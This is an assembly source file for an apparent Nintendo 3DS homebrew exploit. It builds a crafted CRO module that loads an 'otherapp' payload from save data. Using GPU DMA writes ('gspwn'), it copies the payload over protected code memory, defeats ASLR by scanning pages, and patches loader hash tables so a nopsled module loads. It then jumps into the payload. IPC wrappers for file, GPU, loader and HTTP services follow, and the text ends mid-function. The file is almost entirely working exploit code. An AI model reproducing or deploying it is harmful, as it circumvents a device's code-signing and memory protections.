/*
Copyright 2016 Seth VanHeulen

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include "constants.h"

.org 0x80, 0
    .ascii "CRO0" // magic
    .word _cro_module_name // module name offset
    .word 0 // next cro pointer
    .word 0 // previous cro pointer
    .word _cro_file_end // file size
    .word 0 // .bss size
    .word 0 // unknown
    .word 0 // unknown
    .word 0 // nnroControlObject_ segment offset
    .word 0xffffffff // OnLoad segment offset
    .word 0xffffffff // OnExit segment offset
    .word 0xffffffff // OnUnresolved segment offset
    .word _cro_text_start // .text offset
    .word _cro_module_name-_cro_text_start // .text size
    .word _cro_data_start // .data offset
    .word _cro_data_end-_cro_data_start // .data size
    .word _cro_module_name // module name offset
    .word _cro_segment_table-_cro_module_name // module name size
    .word _cro_segment_table // segment table offset
    .word (_cro_named_export_table-_cro_segment_table)/0xc // segment table count
    .word _cro_named_export_table // named export table offset
    .word (_cro_export_tree-_cro_named_export_table)/8 // named export table count
    .word _cro_indexed_export_table // indexed export table offset
    .word (_cro_export_strings-_cro_indexed_export_table)/4 // indexed export table count
    .word _cro_export_strings // export strings offset
    .word _cro_import_module_table-_cro_export_strings // export strings size
    .word _cro_export_tree // export tree offset
    .word (_cro_indexed_export_table-_cro_export_tree)/8 // export tree count
    .word _cro_import_module_table // import module table offset
    .word (_cro_import_patches-_cro_import_module_table)/0x14 // import module table count
    .word _cro_import_patches // import patches offset
    .word (_cro_named_import_table-_cro_import_patches)/0xc // import patches count
    .word _cro_named_import_table // named import table offset
    .word (_cro_indexed_import_table-_cro_named_import_table)/8 // named import table count
    .word _cro_indexed_import_table // indexed import table offset
    .word (_cro_anon_import_table-_cro_indexed_import_table)/8 // indexed import table count
    .word _cro_anon_import_table // anonymous import table offset
    .word (_cro_import_strings-_cro_anon_import_table)/8 // anonymous import table count
    .word _cro_import_strings // import strings offset
    .word _cro_unknown1-_cro_import_strings // import strings size
    .word _cro_unknown1 // unknown offset
    .word 0 // unknown count
    .word _cro_relocation_patches // relocation patches offset
    .word (_cro_unknown2-_cro_relocation_patches)/0xc // relocation patches count
    .word _cro_unknown2 // unknown offset
    .word 0 // unknown count

.org 0x180, 0
_cro_text_start:
    // reset stack
    mov sp, #0x10000000
    blx main
    // exit if main returns
    svc 3

.align 1
.thumb
main:
    push {r4-r6,lr}
    sub sp, #0x14
    // open extdata archive
    add r0, sp, #0x8 // archive handle pointer
    bl FSUSER_OpenArchive
    mov r1, #0
    bl error_check
    // open otherapp file
    add r0, sp, #0x10 // file handle pointer
    add r1, sp, #0x8 // archive handle pointer
    adr r2, otherapp_file_path // path
    mov r3, #1 // open flags
    bl FSUSER_OpenFile
    mov r1, #0
    bl error_check
    // get otherapp size
    add r0, sp, #0x10 // file handle pointer
    mov r1, sp // size output pointer
    bl FSFILE_GetSize
    mov r1, #0
    bl error_check
    // round otherapp size to nearest page
    ldr r6, [sp]
    ldr r0, =0xfff
    add r6, r6, r0
    bic r6, r0
    // malloc linear for otherapp
    mov r0, r6 // size
    bl malloc_linear
    mov r5, r0
    // read otherapp file to linear
    add r0, sp, #0x10 // file handle pointer
    mov r1, sp // bytes read pointer
    mov r2, r5 // buffer
    ldr r3, [sp] // size
    bl FSFILE_Read
    mov r1, #0
    bl error_check
    // close otherapp file
    add r0, sp, #0x10 // file handle pointer
    bl FSFILE_Close
    mov r1, #0
    bl error_check
    // close extdata archive
    add r0, sp, #0x8 // archive handle pointer
    bl FSUSER_CloseArchive
    mov r1, #0
    bl error_check
    // flush data cache for linear buffer
    mov r0, r5 // addr
    mov r1, r6 // size
    bl GSPGPU_FlushDataCache
    mov r1, #0
    bl error_check
    // gspwn otherapp from linear buffer to code
    ldr r0, =OTHERAPP_VA // dst
    mov r1, r5 // src
    mov r2, r6 // size
    bl gspwn_aslr
    // clear instruction cache
    bl invalidate_icache
    // setup paramblk in linear buffer
    ldr r0, =GX_TEXTURECOPY
    str r0, [r5, #0x1c]
    ldr r0, =GSPGPU_FLUSHDATACACHE
    str r0, [r5, #0x20]
    ldr r0, =GSPGPU_HANDLE_PTR
    str r0, [r5, #0x58]
    // jump to otherapp code
    mov r0, r5
    ldr r1, =0x0ffffffc
    ldr r2, =OTHERAPP_VA
    blx r2
    add sp, #0x14
    pop {r4-r6,pc}
.pool
.align 2
otherapp_file_path:
    .asciz "/otherapp"

.align 1
.thumb
malloc_heap: // size
    mov r1, r0 // size
    ldr r0, =MTCTRHEAPALLOCATOR_INSTANCE_PTR
    ldr r0, [r0] // this
    mov r2, #1
    lsl r2, r2, #0xc // alignment
    ldr r3, =MTCTRHEAPALLOCATOR_MALLOC
    bx r3
.pool

.align 1
.thumb
malloc_linear: // size
    mov r1, r0 // size
    ldr r0, =MTEXHEAPALLOCATOR_INSTANCE_PTR
    ldr r0, [r0] // this
    mov r2, #1
    lsl r2, r2, #0xc // alignment
    ldr r3, =MTEXHEAPALLOCATOR_MALLOC
    bx r3
.pool

.align 1
.thumb
memcpy: // dst, src, size
    ldr r3, =MEMCPY
    bx r3
.pool

.align 1
.thumb
memclr32: // addr, size
    mov r2, #0
memset32: // addr, size, value
_memset32_set_loop:
    stmia r0!, {r2}
    sub r1, r1, #4
    bne _memset32_set_loop
    bx lr

.align 1
.thumb
memcmp32: // addr1, addr2, size
_memcmp32_compare_loop:
    ldmia r0!, {r3}
    mov r12, r3
    ldmia r1!, {r3}
    cmp r3, r12
    bne _memcmp32_return
    sub r2, r2, #4
    bne _memcmp32_compare_loop
_memcmp32_return:
    bx lr

.align 1
.thumb
strlen: // str
    mov r1, #0
_strlen_count_loop:
    ldrb r2, [r0,r1]
    add r1, r1, #1
    cmp r2, #0
    bne _strlen_count_loop
    sub r0, r1, #1
    bx lr

.align 1
.thumb
strcpy: // dst, src
_strcpy_copy_loop:
    ldrb r2, [r1]
    add r1, r1, #1
    strb r2, [r0]
    add r0, r0, #1
    cmp r2, #0
    bne _strcpy_copy_loop
    sub r0, r0, #1
    bx lr

.align 1
.thumb
format_result_code: // dst, result_code
    push {r4,lr}
    mov r4, #0x1c
_format_result_code_char_loop:
    mov r2, r1
    lsr r2, r4
    mov r3, #0xf
    and r2, r3
    cmp r2, #9
    bls _format_result_code_number
    add r2, r2, #7
_format_result_code_number:
    add r2, #0x30
    strb r2, [r0]
    add r0, r0, #1
    sub r4, r4, #4
    bpl _format_result_code_char_loop
    mov r1, #0
    strb r1, [r0]
    pop {r4,pc}

.align 1
.thumb
error_check: // result_code, framebuffer
    cmp r0, #0
    bne _error_check_display
    bx lr
_error_check_display:
    push {r0,r1,lr}
    sub sp, #0x14
    add r0, sp, #4
    adr r1, error_label
    bl strcpy
    ldr r1, [sp,#0x14]
    bl format_result_code
    ldr r0, [sp,#0x18]
    cmp r0, #0
    bne _error_check_clear
    bl screen_setup
    str r0, [sp,#0x18]
_error_check_clear:
    mov r1, #0
    bl screen_clear
    ldr r0, [sp,#0x18]
    mov r1, #155
    mov r2, #117
    ldr r3, =0xf800
    str r3, [sp]
    add r3, sp, #4
    bl screen_print
_error_check_sleep_loop:
    mov r0, #1
    lsl r0, r0, #0x14
    mov r1, #0
    svc 0xa
    b _error_check_sleep_loop
    add sp, #0x1c
    pop {pc}
.pool
.align 2
error_label:
    .asciz "ERROR: "

.align 1
.thumb
screen_setup:
    push {r4,lr}
    ldr r0, =400*240*2 // size
    bl malloc_linear
    mov r4, r0 // framebuffer
    bl GSPGPU_SetBufferSwap
    mov r0, r4
    pop {r4,pc}
.pool

.align 1
.thumb
screen_clear: // framebuffer, color
    lsl r2, r1, #0x10
    orr r2, r1 // value
    ldr r1, =400*240*2 // size
    b memset32
.pool

.align 1
.thumb
screen_print: // framebuffer, x, y, string, color
    push {r4,r5,lr}
    mov r4, r0
    ldr r0, =240*2
    mul r1, r0
    add r4, r4, r1
    lsl r2, r2, #1
    add r4, r4, r2
    mov r5, r3
_screen_print_char_loop:
    ldrb r0, [r5]
    cmp r0, #0
    beq _screen_print_return
    cmp r0, #0x2d
    blt _screen_print_default_char
    cmp r0, #0x3a
    ble _screen_print_num_sym
    cmp r0, #0x41
    blt _screen_print_default_char
    cmp r0, #0x5a
    ble _screen_print_alpha
_screen_print_default_char:
    mov r0, #0
    b _screen_print_setup_bit_loop
_screen_print_alpha:
    sub r0, r0, #6
_screen_print_num_sym:
    sub r0, r0, #0x2d
    lsl r0, r0, #2
    adr r1, font_data
    add r0, r0, r1
    ldr r0, [r0]
_screen_print_setup_bit_loop:
    mov r1, #6
    mov r2, #5
_screen_print_bit_loop:
    lsl r3, r0, #0x1f
    beq _screen_print_background
    ldr r3, [sp,#0xc]
    strh r3, [r4]
_screen_print_background:
    lsr r0, r0, #1
    add r4, r4, #2
    sub r1, r1, #1
    bne _screen_print_bit_loop
    ldr r1, =240*2
    sub r1, r1, #0xc
    add r4, r4, r1
    mov r1, #6
    sub r2, r2, #1
    bne _screen_print_bit_loop
    ldr r0, =240*2
    add r4, r4, r0
    add r5, r5, #1
    b _screen_print_char_loop
_screen_print_return:
    pop {r4,r5,pc}
.pool
.align 2
font_data:
    .word 0x08208208, 0x00001000, 0x2040c081, 0x1e86d85e, 0x0007f440 // - . / 0 1
    .word 0x199658d1, 0x16a69852, 0x3f10413c, 0x26a69a79, 0x26a69a5e // 2 3 4 5 6
    .word 0x30a248a1, 0x16a69a56, 0x1e965959, 0x00012000, 0x0f52450f // 7 8 9 : A
    .word 0x16a69a7f, 0x2186185e, 0x1e86187f, 0x21a69a7f, 0x20a28a3f // B C D E F
    .word 0x2ea6985e, 0x3f20823f, 0x0087f840, 0x0083e841, 0x2350823f // G H I J K
    .word 0x0104107f, 0x3f40843f, 0x3f08c43f, 0x1e86185e, 0x1892493f // L M N O P
    .word 0x1d8a585e, 0x17a28a3f, 0x26a69a51, 0x2083f820, 0x3e04107e // Q R S T U
    .word 0x3c0810bc, 0x3f0840bf, 0x2148c4a1, 0x30207230, 0x31a69963 // V W X Y Z

.align 1
.thumb
gspwn_aslr: // dst, src, size
    push {r0-r2,r4-r7,lr}
    lsr r4, r2, #0xc
    ldr r5, =CODEBIN_START_LINEAR
    ldr r0, =0x1000 // size
    bl malloc_linear
    mov r6, r0
_gspwn_aslr_linear_loop:
    mov r0, r6 // dst
    mov r1, r5 // src
    ldr r2, =0x1000 // size
    bl gspwn
    mov r0, r6 // addr
    ldr r1, =0x1000 // size
    bl GSPGPU_InvalidateDataCache
    mov r1, #0
    bl error_check
    mov r7, #0
_gspwn_aslr_virtual_loop:
    ldr r0, [sp]
    add r0, r0, r7 // addr1
    mov r1, r6 // addr2
    ldr r2, =0x100 // size
    bl memcmp32
    beq _gspwn_aslr_found_page
    ldr r0, =0x1000
    add r7, r7, r0
    ldr r1, [sp,#8]
    cmp r7, r1
    bne _gspwn_aslr_virtual_loop
    add r5, r5, r0
    b _gspwn_aslr_linear_loop
_gspwn_aslr_found_page:
    mov r0, r5 // dst
    ldr r1, [sp,#4]
    add r1, r1, r7 // src
    ldr r2, =0x1000 // size
    bl gspwn
    ldr r0, =0x1000
    add r5, r5, r0
    sub r4, r4, #1
    bne _gspwn_aslr_linear_loop
    add sp, #0xc
    pop {r4-r7,pc}
.pool

.align 1
.thumb
gspwn: // dst, src, size
    push {r4,lr}
    sub sp, #0x10
    mov r3, r0
    mov r0, r1 // src
    mov r1, r3 // dst
    mov r3, #0 // input dimensions
    str r3, [sp] // output dimensions
    str r3, [sp,#4] // unused
    str r3, [sp,#8] // unused
    mov r4, #8
    str r4, [sp,#0xc] // flags
    ldr r4, =GX_TEXTURECOPY
    blx r4
    mov r0, #1
    lsl r0, r0, #0x14
    mov r1, #0
    svc 0xa
    add sp, #0x10
    pop {r4,pc}
.pool

.align 1
.thumb
invalidate_icache:
    push {r4,r5,lr}
    sub sp, #4
    ldr r0, =ICACHE_SIZE+0x2000 // size
    bl malloc_heap
    mov r4, r0 // addr
    ldr r1, =ICACHE_SIZE+0x2000 // size
    bl memclr32
    mov r0, r4 // dst
    adr r1, nopsled_header // src
    mov r2, #0xff
    add r2, r2, #0x35 // size
    bl memcpy
    ldr r0, =ICACHE_SIZE+0x1000
    add r0, r0, r4 // dst
    adr r1, nopsled_tables // src
    mov r2, #0x70 // size
    bl memcpy
    ldr r0, =ICACHE_SIZE+0x180
    add r0, r0, r4
    ldr r1, =0xe12fff1e
    str r1, [r0]
    adr r0, nopsled_crr_hash // hash
    bl patch_crr
    ldr r5, =CRO_MAP_FIX
    sub r5, r4, r5
    mov r0, r4 // addr
    mov r1, r5 // mapped addr
    ldr r2, =ICACHE_SIZE+0x2000 // size
    bl LDRRO_LoadCRO_New
    mov r1, #0
    bl error_check
    add r5, r5, #0xff
    add r5, r5, #0x81
    blx r5
    add sp, #4
    pop {r4,r5,pc}
.pool
.align 2
nopsled_header:
    .incbin CRO_FILE_PATH, 0, 0x134
nopsled_tables:
    .incbin CRO_FILE_PATH, ICACHE_SIZE+0x1000, 0x70
nopsled_crr_hash:
    .incbin CRO_FILE_PATH, ICACHE_SIZE+0x2000-0x20, 0x20

.align 1
.thumb
patch_crr: // hash_ptr
    push {r4-r6,lr}
    mov r4, r0
    ldr r0, =CRR_HASH_COUNT*0x20 // size
    bl malloc_linear
    mov r5, r0
    mov r6, #0
_patch_crr_copy_loop:
    add r0, r5, r6 // dst
    mov r1, r4 // src
    mov r2, #0x20 // size
    bl memcpy
    add r6, r6, #0x20
    ldr r0, =CRR_HASH_COUNT*0x20
    cmp r6, r0
    bne _patch_crr_copy_loop
    mov r0, r5 // addr
    ldr r1, =CRR_HASH_COUNT*0x20 // size
    bl GSPGPU_FlushDataCache
    mov r1, #0
    bl error_check
    ldr r0, =CRR_START_LINEAR+0x360 // dst
    mov r1, r5 // src
    ldr r2, =CRR_HASH_COUNT*0x20 // size
    bl gspwn
    pop {r4-r6,pc}
.pool

.align 2
.arm
_get_command_buffer:
    mrc p15, 0, r0, c13, c0, 3
    add r0, r0, #0x80
    bx lr

.align 1
.thumb
FSUSER_OpenFile: // file_handle_ptr, archive_handle_ptr, path, open_flags
    push {r0,r4-r7,lr}
    blx _get_command_buffer
    mov r4, r0
    ldr r0, =0x80201c2 // header code
    ldmia r1!, {r5,r6} // archive handle
    mov r1, #0 // transaction
    mov r7, #3 // path type
    stmia r4!, {r0,r1,r5-r7}
    mov r5, r2 // path
    mov r0, r2 // str
    bl strlen
    add r0, r0, #1 // path size
    mov r1, r3 // open flags
    mov r2, #0 // attributes
    lsl r3, r0, #0xe
    add r3, r3, #2 // path size
    stmia r4!, {r0-r3,r5}
    ldr r0, =FSUSER_HANDLE_PTR
    ldr r0, [r0] // service handle
    svc 0x32
    pop {r5}
    cmp r0, #0
    blt _FSUSER_OpenFile_return
    sub r4, #0x24
    ldmia r4!, {r0-r2} // result code
    str r2, [r5] // file handle
_FSUSER_OpenFile_return:
    pop {r4-r7,pc}
.pool

.align 1
.thumb
FSUSER_DeleteFile: // archive_handle_ptr, path
    push {r1,r4-r7,lr}
    ldmia r0!, {r3,r5} // archive id
    mov r0, r1
    bl strlen
    add r7, r0, #1 // path size
    blx _get_command_buffer
    mov r4, r0
    ldr r1, =0x8040142 // header code
    mov r2, #0 // transaction
    mov r6, #3 // path type
    stmia r0!, {r1-r3,r5-r7}
    lsl r1, r7, #0xe
    add r1, r1, #2 // path size
    pop {r2} // path
    stmia r0!, {r1,r2}
    ldr r0, =FSUSER_HANDLE_PTR
    ldr r0, [r0] // service handle
    svc 0x32
    blt _FSUSER_DeleteFile_return
    ldr r0, [r4,#4] // result code
_FSUSER_DeleteFile_return:
    pop {r4-r7,pc}
.pool

.align 1
.thumb
FSUSER_CreateFile: // archive_handle_ptr, path, file_size_low, file_size_high
    push {r1-r3,r4-r7,lr}
    ldmia r0!, {r3,r5} // archive id
    mov r0, r1
    bl strlen
    add r7, r0, #1 // path size
    blx _get_command_buffer
    mov r4, r0
    ldr r1, =0x8080202 // header code
    mov r2, #0 // transaction
    mov r6, #3 // path type
    stmia r0!, {r1-r3,r5-r7}
    mov r1, r2 // attributes
    pop {r6} // path
    pop {r2,r3} // file size
    lsl r5, r7, #0xe
    add r5, r5, #2 // path size
    stmia r0!, {r1-r3,r5,r6}
    ldr r0, =FSUSER_HANDLE_PTR
    ldr r0, [r0] // service handle
    svc 0x32
    cmp r0, #0
    blt _FSUSER_CreateFile_return
    ldr r0, [r4,#4] // result code
_FSUSER_CreateFile_return:
    pop {r4-r7,pc}
.pool

.align 1
.thumb
FSUSER_OpenArchive: // archive_handle_ptr
    push {r0,r4-r6,lr}
    blx _get_command_buffer
    mov r4, r0
    ldr r0, =0x80c00c2 // header code
    mov r1, #6 // archive id
    mov r2, #2 // path type
    mov r3, #0xc // path size
    lsl r5, r3, #0xe
    add r5, r5, #2 // path size
    adr r6, extdata_archive_path // path
    stmia r4!, {r0-r3,r5,r6}
    ldr r0, =FSUSER_HANDLE_PTR
    ldr r0, [r0] // service handle
    svc 0x32
    pop {r5}
    cmp r0, #0
    blt _FSUSER_OpenArchive_return
    sub r4, #0x14
    ldmia r4!, {r0-r2} // result code
    stmia r5!, {r1,r2} // archive handle
_FSUSER_OpenArchive_return:
    pop {r4-r6,pc}
.pool
.align 2
extdata_archive_path:
    .word 0x1
    .word EXTDATA_ID
    .word 0

.align 1
.thumb
FSUSER_CloseArchive: // archive_handle_ptr
    push {r4,lr}
    ldmia r0!, {r2,r3}
    blx _get_command_buffer
    mov r4, r0
    ldr r1, =0x80e0080 // header code
    stmia r0!, {r1-r3}
    ldr r0, =FSUSER_HANDLE_PTR
    ldr r0, [r0] // service handle
    svc 0x32
    cmp r0, #0
    blt _FSUSER_CloseArchive_return
    ldr r0, [r4,#4] // result code
_FSUSER_CloseArchive_return:
    pop {r4,pc}
.pool

.align 1
.thumb
FSFILE_Read: // file_handle_ptr, bytes_read_ptr, buffer, size
    push {r1,r4-r7,lr}
    mov r5, r0
    blx _get_command_buffer
    mov r4, r0
    ldr r0, =0x80200c2 // header code
    mov r1, #0 // file offset (low)
    mov r7, r2 // buffer
    mov r2, r1 // file offest (high)
    lsl r6, r3, #4
    add r6, #0xc // size
    stmia r4!, {r0-r3,r6,r7}
    ldr r0, [r5] // file handle
    svc 0x32
    pop {r5}
    cmp r0, #0
    blt _FSFILE_Read_return
    sub r4, #0x14
    ldmia r4!, {r0,r1} // result code
    str r1, [r5] // bytes read
_FSFILE_Read_return:
    pop {r4-r7,pc}
.pool

.align 1
.thumb
FSFILE_Write: // file_handle_ptr, bytes_written_ptr, buffer, size
    push {r1,r4-r7,lr}
    mov r5, r0
    blx _get_command_buffer
    mov r4, r0
    ldr r0, =0x8030102 // header code
    mov r1, #0 // file offset (low)
    mov r7, r2 // buffer
    mov r2, r1 // file offest (high)
    lsl r6, r3, #4
    add r6, #0xa // size
    stmia r4!, {r0-r3,r6,r7}
    ldr r0, [r5] // file handle
    svc 0x32
    pop {r5}
    cmp r0, #0
    blt _FSFILE_Write_return
    sub r4, #0x18
    ldmia r4!, {r0,r1} // result code
    str r1, [r5] // bytes written
_FSFILE_Write_return:
    pop {r4-r7,pc}
.pool

.align 1
.thumb
FSFILE_GetSize: // file_handle_ptr, file_size_ptr
    push {r1,r4,r5,lr}
    mov r1, r0
    blx _get_command_buffer
    mov r4, r0
    ldr r0, =0x8040000
    str r0, [r4] // header code
    ldr r0, [r1] // file handle
    svc 0x32
    pop {r5}
    cmp r0, #0
    blt _FSFILE_GetSize_return
    add r4, r4, #4
    ldmia r4!, {r0-r2} // result code
    stmia r5!, {r1,r2} // file size
_FSFILE_GetSize_return:
    pop {r4,r5,pc}
.pool

.align 1
.thumb
FSFILE_Close: // file_handle_ptr
    push {r4,lr}
    mov r1, r0
    blx _get_command_buffer
    mov r4, r0
    ldr r0, =0x8080000 // header code
    str r0, [r4]
    ldr r0, [r1] // file handle
    svc 0x32
    cmp r0, #0
    blt _FSFILE_Close_return
    ldr r0, [r4,#4] // result code
_FSFILE_Close_return:
    pop {r4,pc}
.pool

.align 1
.thumb
GSPGPU_FlushDataCache: // addr, size
    ldr r2, =GSPGPU_FLUSHDATACACHE
    bx r2
.pool

.align 1
.thumb
GSPGPU_InvalidateDataCache: // addr, size
    push {r0,r1,r4-r6,lr}
    blx _get_command_buffer
    mov r4, r0
    ldr r1, =0x90082 // header code
    pop {r2,r3} // addr, size
    mov r5, #0 // unknown
    ldr r6, =0xffff8001 // kprocess handle
    stmia r0!, {r1-r3,r5,r6}
    ldr r0, =GSPGPU_HANDLE_PTR
    ldr r0, [r0] // service handle
    svc 0x32
    cmp r0, #0
    blt _GSPGPU_InvalidateDataCache_return
    ldr r0, [r4,#4] // result code
_GSPGPU_InvalidateDataCache_return:
    pop {r4-r6,pc}
.pool

.align 1
.thumb
GSPGPU_SetBufferSwap: // framebuffer
    push {r4-r7,lr}
    mov r5, r0 // framebuffer
    blx _get_command_buffer
    mov r4, r0
    ldr r1, =0x50200 // header code
    mov r2, #0 // screen
    mov r3, r2 // active framebuffer
    mov r6, r5 // framebuffer
    ldr r7, =240*2 // stride
    stmia r0!, {r1-r3,r5-r7}
    mov r1, #0xff
    add r1, #0x43 // format
    stmia r0!, {r1-r3}
    ldr r0, =GSPGPU_HANDLE_PTR
    ldr r0, [r0] // service handle
    svc 0x32
    cmp r0, #0
    blt _GSPGPU_SetBufferSwap_return
    ldr r0, [r4,#4] // result code
_GSPGPU_SetBufferSwap_return:
    pop {r4-r7,pc}
.pool

.align 1
.thumb
LDRRO_LoadCRO_New: // addr, mapped_addr, size
    push {r0-r2,r4,r5,lr}
    blx _get_command_buffer
    mov r4, r0
    ldr r1, =0x902c2 // header code
    pop {r2,r3,r5} // addr, mapped addr, size
    stmia r0!, {r1-r3,r5}
    mov r1, #0
    mov r2, r1
    stmia r0!, {r1,r2} // data buffer, unknown
    stmia r0!, {r1} // data buffer size
    mov r3, #1
    stmia r0!, {r1-r3} // bss buffer, bss buffer size, auto-link
    stmia r0!, {r3} // fix level
    ldr r3, =0xffff8001
    stmia r0!, {r1-r3} // unknown, transaction, kprocess handle
    ldr r0, =LDRRO_HANDLE_PTR
    ldr r0, [r0] // service handle
    svc 0x32
    cmp r0, #0
    blt _LDRRO_LoadCRO_New_return
    ldr r0, [r4,#4] // result code
_LDRRO_LoadCRO_New_return:
    pop {r4,r5,pc}
.pool

.align 1
.thumb
SRV_GetServiceHandle: // service_handle_ptr, service_name
    push {r0,r1,r4-r6,lr}
    mov r0, r1
    bl strlen
    mov r3, r0 // name size
    blx _get_command_buffer
    mov r4, r0
    ldr r0, =0x50100 // header code
    pop {r5,r6}
    ldmia r6!, {r1,r2} // name
    mov r6, #0 // flags
    stmia r4!, {r0-r3,r6}
    ldr r0, =SRV_HANDLE_PTR
    ldr r0, [r0] // port handle
    svc 0x32
    cmp r0, #0
    blt _SRV_GetServiceHandle_return
    sub r4, #0x10
    ldmia r4!, {r0-r2} // result code
    str r2, [r5] // service handle
_SRV_GetServiceHandle_return:
    pop {r4-r6,pc}
.pool

.align 1
.thumb
HTTPC_Initialize: // service_handle_ptr
    push {r4,r5,lr}
    mov r5, r0
    blx _get_command_buffer
    mov r4, r0
    ldr r1, =0x10044 // header code
    mov r2, #0 // POST buffer size
    mov r3, #0x20 // unknown
    stmia r0!, {r1-r3}
    mov r1, r2 // unknown
    mov r3, r2 // POST buffer handle
    stmia r0!, {r1-r3}
    ldr r0, [r5] // service handle
    svc 0x32
    cmp r0, #0
    blt _HTTPC_Initialize_return
    ldr r0, [r4,#4] // result code
_HTTPC_Initialize_return:
    pop {r4,r5,pc}
.pool

.align 1
.thumb
HTTPC_CreateContext: // service_handle_ptr, context_handle_ptr, url
    push {r0-r2,r4-r7,lr}
    mov r0, r2
    bl strlen
    add r1, r0, #1 // url size
    blx _get_command_buffer
    mov r4, r0
    ldr r0, =0x20082 // header code
    mov r2, #1 // request method
    lsl r6, r1, #4
    add r6, #0xa // url size
    pop {r3,r5,r7} // url
    stmia r4!, {r0-r2,r6,r7}
    ldr r0, [r3] // service handle
    svc 0x32
    cmp r0, #0
    blt _HTTPC_CreateContext_return
    sub r4, #0x10
    ldmia r4!, {r0,r1} // result code
    str r1, [r5] // context handle
_HTTPC_CreateContext_return:
    pop {r4-r7,pc}
.pool

.align 1
.thumb
HTTPC_CloseContext: // service_handle_ptr, context_handle_ptr
    push {r4,lr}
    mov r3, r0
    blx _get_command_buffer
    mov r4, r0
    ldr r2, [r1] // context handle
    ldr r1, =0x30040 // header code
    stmia r0!, {r1,r2}
    ldr r0, [r3] // service handle
    svc 0x32
    cmp r0, #0
    blt _HTTPC_CloseContext_return
    ldr r0, [r4,#4] // result code
_HTTPC_CloseContext_return:
    pop {r4,pc}
.pool

.align 1
.thumb
HTTPC_GetDownloadSizeState: // service_handle_ptr, download_state_ptr, context_handle_ptr
    push {r1,r4,r5,lr}
    mov r3, r0
    blx _get_command_buffer
    mov r4, r0
    ldr r0, =0x60040 // header code
    ldr r1, [r2] // context handle
    stmia r4!, {r0,r1}
    ldr r0, [r3] // service handle
    svc 0x32
    pop {r5}
    cmp r0, #0
    blt _HTTPC_GetDownloadSizeState_return
    sub r4, r4, #4
    ldmia r4!, {r0-r2} // result code
    stmia r5!, {r1,r2} // download state
_HTTPC_GetDownloadSizeState_return:
    pop {r4,r5,pc}
.pool

.align 1
.thumb
HTTPC_InitializeConnectionSession: // service_handle_ptr, context_handle_ptr
    push {r4-r6,lr}
    mov r3, r0
    blx _get_command_buffer
    mov r4, r0
    ldr r2, [r1] // context handle
    ldr r1, =0x80042 // header code
    mov r5, #0x20
    mov r6, #0
    stmia r0!, {r1,r2,r5,r6}
    ldr r0, [r3] // service handle
    svc 0x32
    cmp r0, #0
    blt _HTTPC_InitializeConnectionSession_return
    ldr r0, [r4,#4] // result code
_HTTPC_InitializeConnectionSession_return:
    pop {r4-r6,pc}
.pool

.align 1
.thumb
HTTPC_BeginRequest: // service_handle_ptr, context_handle_ptr
    push {r4,lr}
    mov r3, r0
    blx _get_command_buffer
    mov r4, r0
    ldr r2, [r1] // context handle
    ldr r1, =0x90040 // header code
    stmia r0!, {r1,r2}
    ldr r0, [r3] // service handle
    svc 0x32
    cmp r0, #0
    blt _HTTPC_BeginRequest_return
    ldr r0, [r4,#4] // result code
_HTTPC_BeginRequest_return:
    pop {r4,pc}
.pool

.align 1
.thumb
HTTPC_ReceiveData: // service_handle_ptr, data_buffer, data_buffer_size, context_handle_ptr
    push {r0-r2,r4-r7,lr}
    blx _get_command_buffer
    mov r4, r0
    ldr r1, =0xb0082 // header code
    ldr r2, [r3] // context handle
    pop {r5,r7} // data buffer
    pop {r3} // data buffer size
    lsl r6, r3, #4
    add r6, #0xc // data buffer size
    stmia r0!, {r1-r3,r6,r7}
    ldr r0, [r5] // service handle
    svc 0x32
    cmp r0, #0
    blt _HTTPC_ReceiveData_return
    ldr r0, [r4,#4] // result code
_HTTPC_ReceiveData_return:
    pop {r4-r7,pc}
.pool

.align 1
.thumb
HTTPC_SetProxyDefault: // service_handle_ptr, context_handle_ptr
    push {r4,lr}
    mov r3, r0
    blx _get_command_buffer
    mov r4, r0
    ldr r2, [r1] // context handle
    ldr r1, =0xe0040 // header code
    stmia r0!, {r1,r2}
    ldr r0, [r3] // service handle
    svc 0x32
    cmp r0, #0
    blt _HTTPC_SetProxyDefault_return
    ldr r0, [r4,#4] // result code
_HTTPC_SetProxyDefault_return:
    pop {r4,pc}
.pool

.align 1
.thumb
HTTPC_AddRequestHeader: // service_handle_ptr, context_handle_ptr, name_buffer, value_buffer
    push {r0,r2-r7,lr}
    ldr r5, [r1] // context handle
    mov r0, r2
    bl strlen
    add r6, r0, #1 // name size
    mov r0, r3
    bl strlen
    add r7, r0, #1 // value size
    blx _get_command_buffer
    mov r4, r0
    ldr r1, =0x1100c4 // header code
    stmia r0!, {r1,r5-r7}
    lsl r2, r6, #0xe
    ldr r3, =0xc02
    orr r2, r3 // name size
    lsl r5, r7, #4
    add r5, #0xa // value size
    pop {r1,r3,r6} // name, value
    stmia r0!, {r2,r3,r5,r6}
    ldr r0, [r1] // service handle
    svc 0x32
    cmp r0, #0
    blt _HTTPC_AddRequestHeader_return
    ldr r0, [r4,#4] // result code
_HTTPC_AddRequestHeader_return:
    pop {r4-r7,pc}
.pool

.align 1
.thumb
HTTPC_GetResponseHeader: // service_handle_ptr, context_handle_ptr, name_buffer, value_buffer, value_buffer_size
    push {r0,r2-r7,lr}
    ldr r3, [r1] // context handle
    mov r0, r2
    bl strlen
    add r5, r0, #1 // name size
    blx _get_command_buffer
    mov r4, r0
    ldr r1, =0x1e00c4 // header code
    ldr r6, [sp,#0x20] // value size
    lsl r7, r5, #0xe
    ldr r2, =0xc02
    orr r7, r2 // name size
    stmia r0!, {r1,r3,r5-r7}
    lsl r3, r6, #4
    add r3, #0xc // value size
    pop {r1,r2,r5} // name, value
    stmia r0!, {r2,r3,r5}
    ldr r0, [r1] // service handle
    svc 0x32
    cmp r0, #0
    blt _HTTPC_GetResponseHeader_return
    ldr r0, [r4,#4] // result code
_HTTPC_GetResponseHeader_return:
    pop {r4-r7,pc}
.pool

.align 1
.thumb
HTTPC_GetResponseStatusCode: // service_handle_ptr, status_code_ptr, context_handle_ptr
    push {r1,r4,r5,lr}
    mov r3, r0
    blx _get_command_buffer
    mov r4, r0
    ldr r0, =0x220040 // header code
    ldr r1, [r2] // context handle
    stmia r4!, {r0,r1}
    ldr r0, [r3] // service handle
